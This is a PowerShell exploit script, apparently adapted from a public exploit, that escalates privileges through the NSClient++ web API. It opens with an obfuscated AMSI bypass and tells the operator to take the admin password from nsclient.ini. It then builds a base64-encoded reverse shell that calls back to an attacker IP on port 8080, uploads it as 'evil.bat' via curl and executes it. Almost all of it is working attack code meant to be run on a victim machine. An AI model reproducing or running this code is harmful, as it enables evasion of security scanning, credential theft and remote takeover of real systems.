#I'm write this exploit for fun, inspired by https://www.exploit-db.com/exploits/46802
# I DON'T Find this vulnerability !
# If exploit will not work at first delete part from there
sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE' ) ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL )."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) )."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),( "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"( ${n`ULl},${t`RuE} );
# To this ;) 
Write-Host "Run this script on victim machine. At first open netcat on port 8080 on attacker machine and check file c:\program files\nsclient++\nsclient.ini for web admin passwd"
$opened = Read-Host "Done? (Y/N)"
if($opened = "Y") {
  $ip = Read-Host "Setup your IP address"
  $shell = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( ""{1}{0}""-F'F','rE' ) ) ; ( GeT-VariaBle ( ""1Q2U"" +""zX"" ) -VaL ).""A``ss``Embly"".""GET``TY``Pe""(( ""{6}{3}{1}{4}{2}{0}{5}"" -f'Util','A','Amsi','.Management.','utomation.','s','System' ) ).""g``etf``iElD""( ( ""{0}{2}{1}"" -f'amsi','d','InitFaile' ),( ""{2}{4}{0}{1}{3}"" -f 'Stat','i','NonPubli','c','c,' )).""sE``T``VaLUE""( `${n``ULl},`${t``RuE} );
`$client = New-Object System.Net.Sockets.TCPClient('$ip',8080);`$stream = `$client.GetStream();[byte[]]`$bytes = 0..65535|%{0};while((`$i = `$stream.Read(`$bytes, 0, `$bytes.Length)) -ne 0){;`$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(`$bytes,0, `$i);`$sendback = (iex `$data 2>&1 | Out-String );`$sendback2 = `$sendback + 'PS ' + (pwd).Path + '> ';`$sendbyte = ([text.encoding]::ASCII).GetBytes(`$sendback2);`$stream.Write(`$sendbyte,0,`$sendbyte.Length);`$stream.Flush()};`$client.Close();"
  $bytes = [System.Text.Encoding]::Unicode.GetBytes($shell)
  $encodedCommand = [Convert]::ToBase64String($bytes)
  $passwd = Read-Host "Write here web admin password from c:\program files\nsclient++\nsclient.ini"
  curl.exe -s -k -u admin:$passwd -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/evil.bat --data-binary "powershell.exe -exec bypass -nop -encodedcommand $encodedCommand"
  curl.exe -s -k -u admin:$passwd https://localhost:8443/api/v1/queries/evil/commands/execute?time=1m.
  Write-Host "check netcat for shell"
}else {
  Write-Host "Bye"
}
